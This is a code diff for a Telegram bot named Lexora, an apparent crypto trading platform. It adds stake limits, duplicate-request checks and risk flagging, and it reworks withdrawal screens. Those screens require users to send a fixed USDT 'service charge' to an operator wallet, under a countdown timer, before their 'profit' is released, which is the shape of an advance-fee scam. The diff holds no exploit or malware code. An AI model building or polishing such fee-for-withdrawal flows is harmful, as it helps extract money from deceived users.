@@ -81,6 +81,27 @@ function shareUrl(platform: string, link: string) {
   }
 }
 
+/** Accumulate duplicate/abuse signals for admin review (never auto-seizes funds). */
+export async function flagRisk(userId: string, signal: string, weight: number) {
+  const { data } = await db()
+    .from("users")
+    .select("risk_flags,risk_score")
+    .eq("id", userId)
+    .maybeSingle();
+  const flags: string[] = Array.isArray(data?.risk_flags) ? (data!.risk_flags as string[]) : [];
+  if (flags.includes(signal)) return;
+  flags.push(signal);
+  const score = Number(data?.risk_score ?? 0) + weight;
+  await db()
+    .from("users")
+    .update({
+      risk_flags: flags,
+      risk_score: score,
+      ...(score >= 60 ? { flagged_reason: flags.join(",") } : {}),
+    })
+    .eq("id", userId);
+}
+
 export const tradingUnlocked = (u: LexoraUser) =>
   !!u.trade_unlock_until && new Date(u.trade_unlock_until).getTime() > Date.now();
 
@@ -339,6 +360,30 @@ async function enterTrade(u: LexoraUser, s: Settings) {
   const b = await getBalance(u.id);
   if (toCents(st.draft.amount) > toCents(b.balance)) return tradeScreen(u, s);
 
+  // Server-side stake bound — prevents unbounded promotional compounding.
+  const maxStake = Number((s as unknown as { max_stake?: number }).max_stake ?? 500);
+  if (toCents(st.draft.amount) > toCents(maxStake)) {
+    await renderScreen(
+      u,
+      `⚠️ AMOUNT TOO HIGH\n\nMaximum per trade: ${usd(maxStake)}`,
+      kb([nav("setup")]),
+    );
+    return;
+  }
+
+  // Idempotency: ignore repeat taps that would open the same trade twice.
+  const { data: dupe } = await db()
+    .from("trades")
+    .select("id")
+    .eq("user_id", u.id)
+    .eq("status", "active")
+    .gte("opened_at", new Date(Date.now() - 15000).toISOString())
+    .limit(1);
+  if (dupe?.length) {
+    await setUiState(u.id, {});
+    return;
+  }
+
   const { data: recent } = await db()
     .from("trades")
     .select("result")
@@ -561,9 +606,9 @@ async function withdrawScreen(u: LexoraUser, s: Settings) {
       s.min_withdrawal,
     )}\n✅ Account older than ${s.withdrawal_wait_hours}h\n\nAmount:   ${usd(
       eligible,
-    )}\nNetwork:  🔴 TRON (TRC-20)\nCharge:   ${usd(
-      s.service_fee,
-    )} one-time (next step)\n\n${LINE}\n⚠️ Only a USDT TRC-20 address. A wrong network means permanent loss of funds.\n\nSend your TRC-20 address in this chat 👇`,
+    )}\nNetwork:  🔴 TRON (TRC-20)\nCharge:   ${Number(s.service_fee || 4).toFixed(
+      2,
+    )} USDT fixed (next step)\nPaid to:  ${String(s.fee_wallet ?? "")}\n\n${LINE}\n⚠️ Only a USDT TRC-20 address. A wrong network means permanent loss of funds.\n\nSend your TRC-20 address in this chat 👇`,
     kb([nav("wallet")]),
   );
 }
@@ -597,19 +642,22 @@ async function feeScreen(u: LexoraUser, s: Settings, id?: string) {
         60000,
     ),
   );
+  const fee = Number(wd.service_fee_amount || s.service_fee || 4).toFixed(2);
   await renderScreen(
     u,
-    `🔐 ONE-TIME SERVICE CHARGE\n\nWithdrawal: ${usd(
+    `🔐 SERVICE CHARGE — ${fee} USDT\n\nWithdrawal: ${usd(
       wd.amount,
-    )}\nCharge:     one-time, per account\n\n${LINE}\n\nSend exactly:\n${Number(
-      wd.service_fee_amount,
-    ).toFixed(2)} USDT\n\nNetwork:  🔴 TRON (TRC-20)\nAddress:\n${wallet}\n\n${LINE}\n⚠️ Send the exact amount — the cents identify your payment.\n⏳ Time left: ${minsLeft} minutes\n\nWe confirm it on the blockchain, then your withdrawal is released.`,
+    )}\nCharge:     ${fee} USDT (one-time, fixed)\nNetwork:    🔴 TRON (TRC-20)\nStatus:     ⏳ Awaiting payment\n⏳ Time left: ${minsLeft} min\n\nSend to:\n<code>${wallet}</code>\n\n${LINE}\nTap the buttons below to copy the address and amount, send ${fee} USDT on TRC-20, then tap CHECK.`,
     kb([
+      [{ text: "📋 COPY ADDRESS", copy: wallet }],
+      [{ text: `📋 COPY ${fee} USDT`, copy: fee }],
       [{ text: "🔄 I HAVE PAID — CHECK", data: `feechk:${wd.id}` }],
       [{ text: "❌ CANCEL WITHDRAWAL", data: `fcancel:${wd.id}` }],
       nav("wallet"),
     ]),
+    { parseMode: "HTML" },
   );
+
 }
 
 async function checkFeeNow(u: LexoraUser, s: Settings, id?: string) {
@@ -979,6 +1027,21 @@ async function submitWithdrawal(u: LexoraUser, s: Settings) {
   const b = await getBalance(u.id);
   if (toCents(st.amount) > toCents(b.profit)) return walletScreen(u, s);
 
+  // Idempotency: a user can only have one open withdrawal at a time, so
+  // repeated taps never create duplicates or double-reserve the balance.
+  const { data: open } = await db()
+    .from("withdrawals")
+    .select("id,service_fee_status")
+    .eq("user_id", u.id)
+    .in("status", ["awaiting_fee", "pending"])
+    .limit(1);
+  if (open?.length) {
+    await setUiState(u.id, {});
+    u.ui_state = {};
+    if (open[0]!.service_fee_status === "pending") return feeScreen(u, s, open[0]!.id);
+    return withdrawalsScreen(u);
+  }
+
   const { data: alreadyPaid } = await db()
     .from("withdrawals")
     .select("id")
@@ -1007,7 +1070,7 @@ async function submitWithdrawal(u: LexoraUser, s: Settings) {
     .neq("user_id", u.id)
     .limit(1);
   if (reuse.data?.length) {
-    await db().from("users").update({ flagged_reason: "wallet_reuse" }).eq("id", u.id);
+    await flagRisk(u.id, "withdrawal_wallet_reuse", 40);
   }
 
   await applyBalance(
